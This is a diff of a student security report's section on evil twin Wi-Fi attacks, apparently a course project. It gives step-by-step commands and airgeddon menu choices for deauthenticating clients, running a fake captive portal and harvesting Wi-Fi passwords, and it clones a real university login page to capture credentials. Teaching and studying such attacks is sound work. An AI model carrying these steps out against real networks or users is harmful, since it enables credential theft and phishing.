@@ -206,17 +206,17 @@ In our example, the md5 hash of the password "12345678" is "25d55ad283aa400af464
 ### 2.4.1. Definition
 An Evil Twin attack is a sophisticated wireless security threat where a malicious actor sets up a rogue wireless access point (AP) that impersonates a legitimate network. This fraudulent AP, often configured with the same SSID (Service Set Identifier) and encryption parameters as the genuine network, deceives unsuspecting users into connecting to it instead of the authentic network.
 
-The primary objective of an Evil Twin attack is to intercept sensitive information transmitted between users and network resources. By luring users to connect to the rogue AP, attackers can capture network traffic, including login credentials, financial data, or personal information. This type of attack exploits the trust users place in wireless networks, posing significant risks to the confidentiality and integrity of their data.\
+The primary objective of an Evil Twin attack is to intercept sensitive information transmitted between users and network resources. By luring users to connect to the rogue AP, attackers can capture network traffic, including login credentials, financial data, or personal information. This type of attack exploits the trust users place in wireless networks, posing significant risks to the confidentiality and integrity of their data.
 
-This attack can be particularly effective in places like airports, cafes, and hotels, where users frequently connect to public Wi-Fi networks without verifying their legitimacy. \
+This attack can be particularly effective in places like airports, cafes, and hotels, where users frequently connect to public Wi-Fi networks without verifying their legitimacy. 
 
-In this report, we will demonstrate our implementation of the evil twin attack on an OPEN, WPA or WPA2 Wi-Fi network.\
+In this report, we will demonstrate our implementation of the evil twin attack on an OPEN, WPA or WPA2 Wi-Fi network.
 
 ### 2.4.2. Attack implementation
 **(Amine)**
-For our example of attack implementation, we have cloned the login web page of CAS TSP and we will try to capture the credentials of our target. \
+For our example of attack implementation, we have cloned the login web page of CAS TSP and we will try to capture the credentials of our target. 
 
-Here are the main steps that we follow it to clone this web page. \
+Here are the main steps that we follow it to clone this web page. 
 
 #### Step 1 : Installing the wget
 ```
@@ -227,14 +227,14 @@ sudo apt-get install wget.
 ```
 wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://cas6.imtbs-tsp.eu/cas/login?service=https://ecampus.imtbs-tsp.eu/uPortal/Login
 ```
-Then these are the steps that we have done it to implement the evil twin attack.\
+Then these are the steps that we have done it to implement the evil twin attack.
 
 #### Step 1 : Install airgeddon :
 ```
 sudo apt update && sudo apt install airgeddon
 ```
 
-## Step 2 : Put interface on monitor mode
+#### Step 2 : Put interface on monitor mode
 Killing Wi-Fi related processes.
 ```
 sudo airmon-ng check kill
@@ -246,52 +246,72 @@ sudo airmon-ng start wlan0
 ```
 
 Now the interface should be in monitor mode, and its name has been changed from "yourWifiInterface" to "yourWiFiInteface**mon**"
-## Step 3 : Start airgeddon
+#### Step 3 : Start airgeddon
 ```
 sudo airgeddon
 ```
 
 Firstly, airgeddon is going to check if you have all necessary packets installed. Press **Enter** to enter in airgeddon terminal.
 
-## Step 4 : Select network in airgeddon
+#### Step 4 : Select network in airgeddon
 Check for **wlan0mon** {**your interface name**} in airgeddon list, and type the number corresponding to it.
 
-## Step 5 : Start Evil Twin attack
+#### Step 5 : Start Evil Twin attack
 ### 5.1 Select attack
 Select option 7
 
 ### 5.2 Find target
-Select option 4 and then **Enter**. A new terminal will open. Let it run for a while to capture the networks, then press Ctrl+C and go back to the main terminal.
+```
+Select option 4 and then **Enter**.
+```
 
+A new terminal will open. Let it run for a while to capture the networks, then press Ctrl+C and go back to the main terminal.
+
+```
 Select the desired network and press enter.
+```
 
 ### 5.3 Select attack with captive portal 
-Select option 9. Press enter twice. Let the scan run for a while and then press Ctrl+C.
-
+```
+Select option 9. Press enter twice.
+```
+Let the scan run for a while ..
+```
+press Ctrl+C.
+```
 ### 5.4 Select network again
+```
 Select the desired SSID.
-
+```
 ### 5.5 Select the Deauthntication attack method
+```
 Select option 1 (Deauth / disassoc amok mkd4 attack).
-
-In "spoof your MAC address", select **y**
-
-In "captures hadshake file", select **n**
-
-In "timeout", type 100
-
+```
+```
+In **spoof your MAC address**, select **y**
+```
+```
+In **captures hadshake file**, select **n**
+```
+```
+In **timeout**, type 100
+```
+```
 Press **Enter**
-
+```
 If the handshake capture was successful, you'll see a message saying "Congratulations !!"
-
+```
 Press **Enter** four times
-
+```
+```
 Select captive portal laguage.
-
-In "captive lortal logo", select **n**
-
+```
+```
+In **captive lortal logo**, select **n**
+```
+```
 Press **Enter**
-
+```
 Wait for the victim to connect to the fake access point and type the right password.
 
 When this happens, you'll get the Wi-Fi password
